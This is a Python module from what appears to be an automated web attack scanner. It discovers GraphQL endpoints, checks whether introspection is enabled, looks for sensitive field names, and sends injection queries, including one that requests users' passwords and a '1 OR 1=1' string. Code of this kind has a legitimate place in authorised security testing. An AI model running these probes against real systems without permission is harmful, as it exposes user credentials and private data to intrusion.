"""
GraphQL attack module.
Discovers GraphQL endpoints, runs introspection, detects info leaks, and probes for injection.
"""
from __future__ import annotations
import json
from urllib.parse import urlparse

from attacks.base import BaseAttack, SessionExpiredError
from rich.console import Console

console = Console(legacy_windows=False)

GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/graphql/v1",
    "/v1/graphql",
    "/query",
    "/api/query",
    "/gql",
    "/graphql/console",
    "/api",
]

_INTROSPECTION = {
    "query": "{__schema{queryType{name}types{name,fields{name}}}}"
}

_INJECTION_QUERIES = [
    '{"query":"{ users { id email password } }"}',
    '{"query":"{ user(id: \\"1 OR 1=1\\") { id } }"}',
    '{"query":"{ __typename }"}',
]

_SENSITIVE_FIELDS = ("password", "secret", "token", "hash", "key", "admin", "role", "email")


def _origin(url: str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


class GraphQLAttack(BaseAttack):
    name = "graphql"
    _tested_bases: set[str] = set()

    async def _probe_endpoint(self, endpoint_url: str) -> list[dict]:
        findings: list[dict] = []

        # Introspection
        try:
            resp = await self.session.post(
                endpoint_url, json=_INTROSPECTION, timeout=10.0
            )
        except SessionExpiredError:
            raise
        except Exception:
            return []

        if resp is None or resp.status_code not in (200, 400):
            return []

        try:
            data = resp.json()
        except Exception:
            data = {}

        body = resp.text or ""

        if "__schema" in body or ("data" in data and "__schema" in str(data.get("data", ""))):
            console.print(
                f"  [bold red][GraphQL][/bold red] Introspection enabled @ {endpoint_url}"
            )
            findings.append({
                "type": "graphql_introspection",
                "value": f"GraphQL introspection enabled @ {endpoint_url}",
                "confidence": 0.75,
            })

            # Check for sensitive field names in schema
            schema_str = body.lower()
            found_sensitive = [f for f in _SENSITIVE_FIELDS if f in schema_str]
            if found_sensitive:
                console.print(
                    f"  [bold red][GraphQL][/bold red] Sensitive schema fields: {found_sensitive}"
                )
                findings.append({
                    "type": "graphql_info_leak",
                    "value": (
                        f"GraphQL schema exposes sensitive fields "
                        f"{found_sensitive} @ {endpoint_url}"
                    ),
                    "confidence": 0.85,
                })

        elif "errors" in data or '"errors"' in body:
            console.print(f"  [dim][GraphQL] Endpoint found (errors): {endpoint_url}[/dim]")
            findings.append({
                "type": "graphql_endpoint",
                "value": f"GraphQL endpoint found @ {endpoint_url}",
                "confidence": 0.55,
            })

        if not findings:
            return []

        # Injection queries
        for raw_query in _INJECTION_QUERIES:
            if self._should_stop():
                return findings
            try:
                qbody = json.loads(raw_query)
                ir = await self.session.post(
                    endpoint_url, json=qbody, timeout=10.0
                )
            except SessionExpiredError:
                raise
            except Exception:
                continue

            if ir is None:
                continue

            body_lower = (ir.text or "").lower()
            if any(f in body_lower for f in _SENSITIVE_FIELDS):
                console.print(
                    f"  [bold red][GraphQL][/bold red] Data leak in query response!"
                )
                findings.append({
                    "type": "graphql_data_leak",
                    "value": f"GraphQL data leak via query @ {endpoint_url}",
                    "confidence": 0.80,
                })
                break

        return findings

    async def run(self, attack_point: dict, _payloads: list[str]) -> list[dict]:
        url = attack_point.get("url", "")
        base = _origin(url)

        if base in GraphQLAttack._tested_bases:
            return []
        GraphQLAttack._tested_bases.add(base)

        console.print(f"  [cyan][GraphQL][/cyan] Probing {base}")

        all_findings: list[dict] = []

        # If the attack point itself looks like a GraphQL endpoint, probe it directly
        if "graphql" in url.lower() or "gql" in url.lower():
            findings = await self._probe_endpoint(url)
            if findings:
                return findings

        # Otherwise iterate candidate paths
        for path in GRAPHQL_PATHS:
            if self._should_stop():
                return all_findings
            endpoint = base + path
            try:
                findings = await self._probe_endpoint(endpoint)
            except SessionExpiredError:
                raise
            except Exception:
                continue

            if findings:
                all_findings.extend(findings)
                break  # First working endpoint is enough

        return all_findings
